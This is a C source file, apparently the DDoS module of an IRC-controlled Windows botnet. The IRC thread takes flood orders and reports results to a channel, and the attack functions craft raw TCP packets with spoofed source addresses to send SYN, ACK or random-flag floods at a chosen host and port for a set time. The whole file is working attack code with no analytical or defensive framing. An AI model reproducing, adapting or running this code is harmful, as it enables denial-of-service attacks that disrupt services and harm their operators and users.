#include "../h/includes.h"
#include "../h/functions.h"

#ifndef NO_DDOS

DWORD WINAPI DDOSThread(LPVOID param)
{
	char sendbuf[IRCLINE];
	DDOS ddos = *((DDOS *)param);
	DDOS *ddoss = (DDOS *)param;
	ddoss->gotinfo = TRUE;
	IRC* irc=(IRC*)ddos.conn;
	srand(GetTickCount());
	if (!ddos.silent)
		irc->pmsg(ddos.target,"%s Flooding %s:%s with %s for %s seconds", ddos_title, ddos.ip, ddos.port, ddos.type, ddos.length);
	sprintf(sendbuf, "%s Done with flood (%iKB/sec).", ddos_title, DDOSAttack(ddos.ip, ddos.port, ddos.type, ddos.length));
	if (!ddos.silent)
		irc->pmsg(ddos.target,"%s",sendbuf);
	clearthread(ddos.threadnum);
	ExitThread(0);
	return 0;
}

long SendDDOS(unsigned long TargetIP, unsigned int SpoofingIP, char *Type, unsigned short TargetPort, int len)
{
	WSADATA WSAData;
	SOCKET sock;
	SOCKADDR_IN addr_in;
	IPHEADER ipHeader;
	TCPHEADER tcpHeader;
	PSDHEADER psdHeader;
	LARGE_INTEGER freq, halt_time, cur;
	char szSendBuf[60]={0},buf[64];
	int rect;
	if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0)
		return FALSE;
	if ((sock = WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED )) == INVALID_SOCKET) {
		WSACleanup();
		return FALSE;
	}
	BOOL flag=TRUE;
	if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) {
		closesocket(sock);
		WSACleanup();
		return FALSE;
	}
	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons((unsigned short)TargetPort);
	addr_in.sin_addr.s_addr=TargetIP;
	ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
	ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
	ipHeader.ident=1;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_TCP;
	ipHeader.checksum=0;
	ipHeader.destIP=TargetIP;
	tcpHeader.th_dport=fhtons((unsigned short)TargetPort);
	tcpHeader.th_sport=fhtons((unsigned short)rand()%1025);
	tcpHeader.th_seq=fhtonl(0x12345678);
	if (strcmp(Type,"ddos.syn") == 0 || strcmp(Type,"wonk.syn") == 0) {
		tcpHeader.th_ack=0;
		tcpHeader.th_flag=SYN;
	} else if (strcmp(Type,"ddos.ack") == 0 || strcmp(Type,"wonk.ack") == 0) {
		tcpHeader.th_ack=0;
		tcpHeader.th_flag=ACK;
	} else if (strcmp(Type,"ddos.random") == 0) {
		tcpHeader.th_ack=rand()%3;
		if (rand()%2 == 0)
			tcpHeader.th_flag=SYN;
		else
			tcpHeader.th_flag=ACK;
	}
	tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0);
	tcpHeader.th_win=fhtons(16384);
	tcpHeader.th_urp=0;
	long total = 0;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&cur);
	halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;

	while (1) {
		tcpHeader.th_sum=0;
		tcpHeader.th_sport=fhtons((unsigned short)((rand() % 1001) + 1000));
		tcpHeader.th_seq=fhtons((unsigned short)((rand() << 16) | rand()));
		ipHeader.sourceIP=fhtonl(SpoofingIP++);
		psdHeader.daddr=ipHeader.destIP;
		psdHeader.zero=0;
		psdHeader.proto=IPPROTO_TCP;
		psdHeader.length=fhtons(sizeof(tcpHeader));
		psdHeader.saddr=ipHeader.sourceIP;
		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
		tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4);
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader));
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(LPSOCKADDR)&addr_in, sizeof(addr_in));
		if (rect==SOCKET_ERROR) {
			sprintf(buf, "[DDoS]: Send error: <%d>.",fWSAGetLastError());
			closesocket(sock);
			WSACleanup();
			return 0;
		}
		total += rect;
		QueryPerformanceCounter(&cur);
		if (cur.QuadPart >= halt_time.QuadPart)
			break;
	}
	closesocket(sock);
	WSACleanup();
	return (total);
}

long DDOSAttack(char *target, char *port, char *type, char *len)
{
	unsigned long IP = finet_addr(target);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(target);
		if (pHE == 0)
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);
	}
	unsigned long TargetIP = IP;
	unsigned short p = atoi(port);
	int t = atoi(len);
	unsigned int SpoofIP = TargetIP + ((rand()%512)+256);
	long num = SendDDOS(TargetIP, SpoofIP, type, p, t);
	if (num == 0)
		num = 1;
	num = num / 1000 / t;
	return num;
}


USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;
    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);
    }
    if (size)
        cksum += *(UCHAR*)buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);
    return (USHORT)(~cksum);
}

#endif
